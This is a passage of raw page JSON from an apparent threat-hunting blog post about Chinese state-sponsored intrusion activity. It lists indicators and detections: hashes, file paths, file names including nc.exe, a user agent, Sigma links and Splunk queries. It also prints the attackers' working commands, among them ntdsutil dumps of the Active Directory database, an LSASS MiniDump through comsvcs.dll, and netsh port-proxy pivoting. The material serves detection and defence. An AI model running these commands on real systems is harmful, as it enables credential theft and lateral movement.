2\u003E&1*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_295":{"__typename":"Paragraph","id":"dcff7a17d5b3_295","name":"a2eb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"D:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_296":{"__typename":"Paragraph","id":"dcff7a17d5b3_296","name":"b6fe","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-EventLog security -instanceid 4624","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_297":{"__typename":"Paragraph","id":"dcff7a17d5b3_297","name":"ede2","type":"PRE","href":null,"layout":null,"metadata":null,"text":"ldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"r"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_298":{"__typename":"Paragraph","id":"dcff7a17d5b3_298","name":"8e21","type":"PRE","href":null,"layout":null,"metadata":null,"text":"makecab ..\\backup\\210829–020000.zip ..\\webapps\\adssp\\html\\Lock.lic","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_299":{"__typename":"Paragraph","id":"dcff7a17d5b3_299","name":"74fb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"move “\\\\\\c$\\users\\public\\Appfile\\registry\\SYSTEM” ..\\backup\\210829–020000.zip","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_300":{"__typename":"Paragraph","id":"dcff7a17d5b3_300","name":"a235","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"kotlin"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_301":{"__typename":"Paragraph","id":"dcff7a17d5b3_301","name":"a6cc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"go"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_302":{"__typename":"Paragraph","id":"dcff7a17d5b3_302","name":"eec8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Rar.exe a –{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_303":{"__typename":"Paragraph","id":"dcff7a17d5b3_303","name":"4faf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"start-process -filepath c:\\windows\\temp\\.bat — windowstyle hidden 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"r"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_304":{"__typename":"Paragraph","id":"dcff7a17d5b3_304","name":"950c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Note: The batch file in question (.bat) could use any name, and no discernable pattern has been determined at this time.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_305":{"__typename":"Paragraph","id":"dcff7a17d5b3_305","name":"4346","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “cmd.exe \u002Fc mkdir C:\\users\\public\\Appfile & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\users\\public\\Appfile\\” q q","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_306":{"__typename":"Paragraph","id":"dcff7a17d5b3_306","name":"e96f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “cmd.exe \u002Fc mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\tmp\\”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_307":{"__typename":"Paragraph","id":"dcff7a17d5b3_307","name":"7413","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “cmd.exe \u002Fc ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\Pro”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_308":{"__typename":"Paragraph","id":"dcff7a17d5b3_308","name":"f4ab","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_309":{"__typename":"Paragraph","id":"dcff7a17d5b3_309","name":"d37b","type":"H4","href":null,"layout":null,"metadata":null,"text":"Command line patterns","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_310":{"__typename":"Paragraph","id":"dcff7a17d5b3_310","name":"659a","type":"P","href":null,"layout":null,"metadata":null,"text":"Certain patterns in commands (with asterisks for wildcards) can be used to identify potentially malicious commands:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_311":{"__typename":"Paragraph","id":"dcff7a17d5b3_311","name":"08ee","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FC dir \u002FS \\\\* \u003E\u003E *","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_312":{"__typename":"Paragraph","id":"dcff7a17d5b3_312","name":"d720","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc * 1\u003E \\\\127.0.0.1\\ADMIN$\\__*.*\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_313":{"__typename":"Paragraph","id":"dcff7a17d5b3_313","name":"3350","type":"PRE","href":null,"layout":null,"metadata":null,"text":"powershell start-process -filepath c:\\windows\\temp\\*.exe — windowstyle hidden","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"r"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_314":{"__typename":"Paragraph","id":"dcff7a17d5b3_314","name":"bdf7","type":"H4","href":null,"layout":null,"metadata":null,"text":"File paths","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_315":{"__typename":"Paragraph","id":"dcff7a17d5b3_315","name":"1b21","type":"P","href":null,"layout":null,"metadata":null,"text":"The most common paths where files and executables used by the actor have been found include:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_316":{"__typename":"Paragraph","id":"dcff7a17d5b3_316","name":"94ef","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Users\\Public\\Appfile (including subdirectories)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"vbnet"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_317":{"__typename":"Paragraph","id":"dcff7a17d5b3_317","name":"02d4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Perflogs (including subdirectories)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_318":{"__typename":"Paragraph","id":"dcff7a17d5b3_318","name":"85ba","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\Temp (including subdirectories)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_319":{"__typename":"Paragraph","id":"dcff7a17d5b3_319","name":"477a","type":"H4","href":null,"layout":null,"metadata":null,"text":"File Names","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_320":{"__typename":"Paragraph","id":"dcff7a17d5b3_320","name":"e641","type":"P","href":null,"layout":null,"metadata":null,"text":"The file names the actor has previously used for such things as malware, scripts, and tools include:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_321":{"__typename":"Paragraph","id":"dcff7a17d5b3_321","name":"6f9b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"backup.bat","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_322":{"__typename":"Paragraph","id":"dcff7a17d5b3_322","name":"c4fd","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cl64.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_323":{"__typename":"Paragraph","id":"dcff7a17d5b3_323","name":"45f7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"update.bat","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_324":{"__typename":"Paragraph","id":"dcff7a17d5b3_324","name":"5a0d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Win.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_325":{"__typename":"Paragraph","id":"dcff7a17d5b3_325","name":"2a1e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"billagent.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_326":{"__typename":"Paragraph","id":"dcff7a17d5b3_326","name":"c1e4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"nc.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_327":{"__typename":"Paragraph","id":"dcff7a17d5b3_327","name":"5560","type":"PRE","href":null,"layout":null,"metadata":null,"text":"update.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_328":{"__typename":"Paragraph","id":"dcff7a17d5b3_328","name":"02ad","type":"PRE","href":null,"layout":null,"metadata":null,"text":"WmiPrvSE.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_329":{"__typename":"Paragraph","id":"dcff7a17d5b3_329","name":"cae6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"billaudit.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_330":{"__typename":"Paragraph","id":"dcff7a17d5b3_330","name":"22cc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"rar.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_331":{"__typename":"Paragraph","id":"dcff7a17d5b3_331","name":"e2af","type":"PRE","href":null,"layout":null,"metadata":null,"text":"vm3dservice.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_332":{"__typename":"Paragraph","id":"dcff7a17d5b3_332","name":"b614","type":"PRE","href":null,"layout":null,"metadata":null,"text":"WmiPreSV.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_333":{"__typename":"Paragraph","id":"dcff7a17d5b3_333","name":"57d1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cisco_up.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_334":{"__typename":"Paragraph","id":"dcff7a17d5b3_334","name":"7b39","type":"PRE","href":null,"layout":null,"metadata":null,"text":"SMSvcService.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_335":{"__typename":"Paragraph","id":"dcff7a17d5b3_335","name":"b69b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"watchdogd.ex","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_336":{"__typename":"Paragraph","id":"dcff7a17d5b3_336","name":"b25b","type":"P","href":null,"layout":null,"metadata":null,"text":"In addition to the file names and paths above, malicious files names, believed to be randomly created, in the following format have also been discovered: C:\\Windows\\[a-zA-Z]{8}.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_337":{"__typename":"Paragraph","id":"dcff7a17d5b3_337","name":"f898","type":"H4","href":null,"layout":null,"metadata":null,"text":"SHA256 file hashes","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_338":{"__typename":"Paragraph","id":"dcff7a17d5b3_338","name":"db22","type":"PRE","href":null,"layout":null,"metadata":null,"text":"f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_339":{"__typename":"Paragraph","id":"dcff7a17d5b3_339","name":"06fd","type":"PRE","href":null,"layout":null,"metadata":null,"text":" ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_340":{"__typename":"Paragraph","id":"dcff7a17d5b3_340","name":"6e5e","type":"PRE","href":null,"layout":null,"metadata":null,"text":" d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_341":{"__typename":"Paragraph","id":"dcff7a17d5b3_341","name":"6736","type":"PRE","href":null,"layout":null,"metadata":null,"text":"472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_342":{"__typename":"Paragraph","id":"dcff7a17d5b3_342","name":"f6ae","type":"PRE","href":null,"layout":null,"metadata":null,"text":" 66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_343":{"__typename":"Paragraph","id":"dcff7a17d5b3_343","name":"62ff","type":"PRE","href":null,"layout":null,"metadata":null,"text":" 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_344":{"__typename":"Paragraph","id":"dcff7a17d5b3_344","name":"d6f0","type":"PRE","href":null,"layout":null,"metadata":null,"text":" 41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_345":{"__typename":"Paragraph","id":"dcff7a17d5b3_345","name":"14d8","type":"PRE","href":null,"layout":null,"metadata":null,"text":" c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_346":{"__typename":"Paragraph","id":"dcff7a17d5b3_346","name":"9d85","type":"PRE","href":null,"layout":null,"metadata":null,"text":" 3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_347":{"__typename":"Paragraph","id":"dcff7a17d5b3_347","name":"2e0b","type":"PRE","href":null,"layout":null,"metadata":null,"text":" fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_348":{"__typename":"Paragraph","id":"dcff7a17d5b3_348","name":"86bf","type":"PRE","href":null,"layout":null,"metadata":null,"text":" ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_349":{"__typename":"Paragraph","id":"dcff7a17d5b3_349","name":"786d","type":"H4","href":null,"layout":null,"metadata":null,"text":"User Agent","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_350":{"__typename":"Paragraph","id":"dcff7a17d5b3_350","name":"8c0b","type":"P","href":null,"layout":null,"metadata":null,"text":"In some cases, the following user-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_351":{"__typename":"Paragraph","id":"dcff7a17d5b3_351","name":"0dd0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Mozilla\u002F5.0 (Windows NT 6.1; WOW64; rv:68.0) Gecko\u002F20100101 Firefox\u002F68.0","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"less"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_352":{"__typename":"Paragraph","id":"dcff7a17d5b3_352","name":"61d5","type":"P","href":null,"layout":null,"metadata":null,"text":"Note: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_353":{"__typename":"Paragraph","id":"dcff7a17d5b3_353","name":"41a8","type":"H4","href":null,"layout":null,"metadata":null,"text":"RUNDLL32","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_354":{"__typename":"Paragraph","id":"dcff7a17d5b3_354","name":"e65c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads. Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_355":{"__typename":"Paragraph","id":"dcff7a17d5b3_355","name":"f5b1","type":"H4","href":null,"layout":null,"metadata":null,"text":"LSASS T1003.001","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_356":{"__typename":"Paragraph","id":"dcff7a17d5b3_356","name":"5120","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002Fc powershell -exec bypass -W hidden -nop -E rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 552 C:\\Windows\\Temp\\vmware-vhost.dmp full","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_357":{"__typename":"Paragraph","id":"dcff7a17d5b3_357","name":"666d","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_access\u002Fproc_access_win_lsass_dump_comsvcs_dll.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":202,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_access\u002Fproc_access_win_lsass_dump_comsvcs_dll.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":90,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":91,"end":192,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_access\u002Fproc_access_win_lsass_dump_comsvcs_dll.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*xTvW3pbbFGmHwzWR"}},"Paragraph:dcff7a17d5b3_358":{"__typename":"Paragraph","id":"dcff7a17d5b3_358","name":"d1bf","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_359":{"__typename":"Paragraph","id":"dcff7a17d5b3_359","name":"2954","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (TargetImage=”*\\\\lsass.exe” AND SourceImage=”C:\\\\Windows\\\\System32\\\\rundll32.exe” AND CallTrace=”*comsvcs.dll*”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"ini"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_360":{"__typename":"Paragraph","id":"dcff7a17d5b3_360","name":"b213","type":"H4","href":null,"layout":null,"metadata":null,"text":"Process Injection T1055","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_361":{"__typename":"Paragraph","id":"dcff7a17d5b3_361","name":"2a57","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_362":{"__typename":"Paragraph","id":"dcff7a17d5b3_362","name":"8022","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_hktl_mimikatz_command_line.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":210,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_hktl_mimikatz_command_line.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":99,"end":200,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_hktl_mimikatz_command_line.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*axE9LUJy_9LB3Yh_"}},"Paragraph:dcff7a17d5b3_363":{"__typename":"Paragraph","id":"dcff7a17d5b3_363","name":"29e0","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_364":{"__typename":"Paragraph","id":"dcff7a17d5b3_364","name":"f956","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((CommandLine=”*DumpCreds*” OR 